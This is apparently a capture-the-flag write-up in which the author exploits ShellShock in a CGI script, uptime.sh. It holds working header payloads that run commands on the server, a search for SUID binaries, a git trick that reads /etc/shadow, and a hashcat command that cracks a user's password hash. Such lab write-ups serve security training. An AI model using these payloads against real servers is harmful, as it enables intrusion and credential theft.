There was cgi-bin/uptime.sh:

![image](https://github.com/jackalkarlos/CTF-Writeups-and-Scripts/assets/88983987/b81ca26d-ac39-4f31-9680-e79b839ce133)

I suspected ShellShock, because there was .sh file on Web Server.

What is ShellShock Vuln:
> https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/

Bash < 4.3 is vulnerable.

I used this header for be sure.

```
Custom: () { ignored; }; echo Content-Type: text/html; echo ; /usr/bin/echo "hi"
```

Response was "hi"

I tried to cat /etc/shadow but i was dont have enough permission for this.

I looked for SUID bit binaries.

```
Custom: () { ignored; }; echo Content-Type: text/html; echo ; /usr/bin/find / -perm -u=s -type f 2>/dev/null

```

There was Git!

I looked gtfobins and used this command and i get password hash.

```
Custom: () { ignored; }; echo Content-Type: text/html; echo ; /usr/bin/git diff /dev/null /etc/shadow
```

And i cracked m4d0k4's password with hashcat.

```
hashcat -m 500 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

